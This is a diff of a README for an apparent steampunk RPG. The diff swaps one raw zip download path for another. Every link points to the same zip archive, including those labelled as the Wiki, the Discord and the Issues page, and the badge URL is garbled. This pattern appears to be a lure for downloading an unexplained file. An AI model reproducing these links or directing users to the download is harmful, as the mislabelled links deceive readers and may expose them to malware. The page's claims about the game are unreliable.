@@ -1,7 +1,7 @@
 # 🎩 chronicles-of-aethergate - Dive Into a Steampunk Adventure
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **chronicles-of-aethergate**! This is a professional steampunk RPG designed to take you on thrilling adventures. Built using Python and Tkinter, it combines rich storytelling, exciting combat, and beautiful graphics.
@@ -23,7 +23,7 @@ To run **chronicles-of-aethergate**, your computer should meet the following req
 ## 📥 Download & Install
 To get started with your adventure, visit the page to download the latest version of **chronicles-of-aethergate**.
 
-[Visit this page to download](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip)
+[Visit this page to download](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip)
 
 ### 🖥️ Installation Steps
 1. **Download the Application:** Click on the link above to access the latest release page.
@@ -42,8 +42,8 @@ To get started with your adventure, visit the page to download the latest versio
 - **Learn Skills:** Upgrade your skills as you progress to become a stronger character.
 
 ## 📚 Additional Resources
-- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip) for in-depth guides and tutorials.
-- **Community:** Join our [Discord](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip) to connect with other players and exchange tips.
-- **Support:** If you encounter any issues, check the [Issues](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/unadventurous/chronicles-of-aethergate.zip) page or submit your question.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip) for in-depth guides and tutorials.
+- **Community:** Join our [Discord](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip) to connect with other players and exchange tips.
+- **Support:** If you encounter any issues, check the [Issues](https://raw.githubusercontent.com/lovlovlo15/chronicles-of-aethergate/main/saves/of-aethergate-chronicles-v2.3.zip) page or submit your question.
 
 Good luck on your journey through the **chronicles-of-aethergate**!
